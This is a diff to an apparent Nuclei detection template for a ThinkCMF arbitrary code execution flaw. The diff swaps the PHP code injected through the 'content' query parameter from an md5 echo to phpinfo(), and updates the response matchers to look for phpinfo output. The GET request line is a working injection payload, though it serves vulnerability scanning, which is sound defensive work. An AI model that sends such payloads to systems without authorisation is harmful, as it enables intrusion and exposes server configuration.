@@ -4,20 +4,23 @@ info:
   name: ThinkCMF Arbitrary code execution
   author: pikpikcu
   severity: high
-  reference:
-    - https://www.shuzhiduo.com/A/l1dygr36Je/
-  tags: thinkcmf,rce
+  reference: https://www.shuzhiduo.com/A/l1dygr36Je/
+  tags: thinkcmf
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');"
+      - "{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20phpinfo();"
 
     matchers-condition: and
     matchers:
       - type: word
         words:
-          - "d9b2c63a497e2f30c4ad9ad083a00691"
+          - "PHP Extension"
+          - "PHP Version"
+          - "PHP License"
+          - "PHP Variables"
+        condition: and
 
       - type: status
         status:
